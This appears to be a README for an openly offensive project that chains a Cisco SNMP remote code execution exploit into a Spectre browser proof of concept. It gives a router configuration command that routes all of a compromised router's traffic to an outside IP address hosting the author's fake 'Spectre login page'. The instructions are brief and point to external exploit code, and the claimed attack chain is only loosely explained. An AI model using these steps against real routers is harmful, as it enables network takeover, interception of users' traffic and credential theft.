# CiscoSpectreTakeover
A chain exploit using the recent Cisco SMP exploit (CVE-2017-6736) to chain into Spectre (CVE-2017-5753 and CVE-2017-5715)

## Credits

Cisco RCE Exploit submodule by artkond: https://github.com/artkond/cisco-snmp-rce

JS Spectre Chrome POC by ascendr: https://github.com/ascendr/spectre-chrome

Tested on a Cisco 1841 Router.

After running the RCE exploit. As config, run:

```Router(config)> ip route 0.0.0.0 0.0.0.0 195.20.52.49```

This will force all traffic through the Spectre login page I created. 
At a later date I will add a better version that addresses actually going to websites.